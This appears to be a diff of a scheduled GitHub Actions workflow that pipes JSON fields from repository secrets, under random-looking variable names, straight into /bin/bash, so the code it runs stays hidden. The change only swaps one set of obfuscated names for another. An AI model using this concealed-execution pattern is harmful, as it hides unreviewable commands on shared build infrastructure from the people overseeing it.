@@ -3,30 +3,18 @@ name: iosshuchu
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 3/6 * * *'
-
-jobs:  # 4502
+    - cron: '50 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: iosshuchu
         env:
-          cv11935: ${{ secrets.cv11935 }}
+          jpvnw41172: ${{ secrets.jpvnw41172 }}
         run: |
-          echo $cv11935 | jq -r .efkw8932 | /bin/bash
-          echo $szho890 | jq -r .npyd53 | /bin/bash
-          echo $a6 | jq -r .ytty7051 | /bin/bash
-          echo $fnw07 | jq -r .ew039 | /bin/bash
-          echo $xn256 | jq -r .weii2 | /bin/bash
-          echo $ga601 | jq -r .x029 | /bin/bash
-          echo $bcn4 | jq -r .uhxx67241 | /bin/bash
-          echo $lpglg32 | jq -r .wxq0831 | /bin/bash
-          echo $zdrbi65082 | jq -r .lnddc4676 | /bin/bash
-          echo $hu19434 | jq -r .env128 | /bin/bash
-          echo $owujw7973 | jq -r .duart20952 | /bin/bash
-          echo $afp95982 | jq -r .u0 | /bin/bash
-          echo $gnjxg53 | jq -r .txt6800 | /bin/bash
-          echo $v0640 | jq -r .wkpc47325 | /bin/bash
+          echo $jpvnw41172 | jq -r .k0804 | /bin/bash
+          echo $by6133 | jq -r .hxf009 | /bin/bash
+          echo $jfdde404 | jq -r .nk11 | /bin/bash
+          echo $y2 | jq -r .y10841 | /bin/bash
 
